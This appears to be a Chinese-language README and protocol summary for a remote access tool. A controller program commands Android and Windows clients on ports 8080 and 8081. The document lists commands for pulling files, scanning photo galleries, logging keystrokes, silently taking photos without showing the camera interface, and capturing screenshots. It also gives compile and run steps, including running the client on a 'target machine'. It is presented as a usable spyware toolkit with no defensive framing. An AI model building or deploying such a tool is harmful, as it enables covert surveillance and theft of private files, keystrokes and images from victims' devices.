# 命令协议总结

## 架构

```
socket_server.exe (控制端)
    ├── 端口 8080 ── Android 被控端 (socket_client / APK)
    └── 端口 8081 ── Windows 被控端 (win_client.exe)
```

## 命令列表

| 命令 | 格式 | 支持平台 | 说明 |
|------|------|----------|------|
| SYSINFO | `CMD:SYSINFO` | Android / Windows | 获取系统信息 |
| LISTDIR | `CMD:LISTDIR:<path>` | Android / Windows | 列出目录内容 |
| GALLERY | `CMD:GALLERY` | Android / Windows | 扫描图片文件列表 |
| GETFILE | `CMD:GETFILE:<path>` | Android / Windows | 获取文件（二进制传输） |
| KEYLOG START | `CMD:KEYLOG:START` | Android / Windows | 开始键盘监听 |
| KEYLOG STOP | `CMD:KEYLOG:STOP` | Android / Windows | 停止键盘监听 |
| CAMERA | `CMD:CAMERA:CAPTURE` | Android | 静默拍照（不弹相机UI） |
| SCREENSHOT | `CMD:SCREENSHOT` | Windows | 截取全屏（BMP格式） |
| EXIT | `CMD:EXIT` | Android / Windows | 断开连接 |

## 响应格式

| 前缀 | 含义 | 示例 |
|------|------|------|
| `OK:` | 成功，后跟文本数据 | `OK:ro.product.model=Pixel 7` |
| `ERR:` | 失败，后跟错误信息 | `ERR:文件不存在: /sdcard/a.txt` |
| `DATA:<len>\n` | 二进制数据，后跟 `<len>` 字节 | `DATA:204800\n<bytes>` |
| `KEYEVENT:` | 键盘事件（持续推送） | `KEYEVENT:A` / `KEYEVENT:[ENTER]` |

文本响应以 `\nEND\n` 结尾。

## 路径示例

**Android**
```
/sdcard
/sdcard/DCIM/Camera/photo.jpg
/storage/emulated/0/Download/file.zip
```

**Windows**
```
C:\Users\user\Documents
C:\Users\user\Pictures\photo.jpg
```

## 编译

```cmd
# 控制端
gcc socket_server.c -o server.exe -lws2_32

# Windows 被控端
cd win-controller
gcc win_client.c -o win_client.exe -lws2_32 -lgdi32 -lshell32 -O2 -static
```

## 运行

```cmd
# 1. 控制端先启动
server.exe

# 2. Windows 被控端连接（目标机器上运行）
win_client.exe 192.168.1.100 8081

# 3. Android 被控端连接（APK 内填写 IP 后启动）
# 连接端口 8080
```

## 控制端操作

```
l        列出所有已连接客户端
<数字>   选择客户端进入控制菜单
q        退出

控制菜单:
1        系统信息
2        列出目录
3        获取文件
4        图库列表
5        键盘监听（按 q 停止）
6        拍照 (Android) / 截屏 (Windows)
0        断开此客户端
b        返回主菜单
```
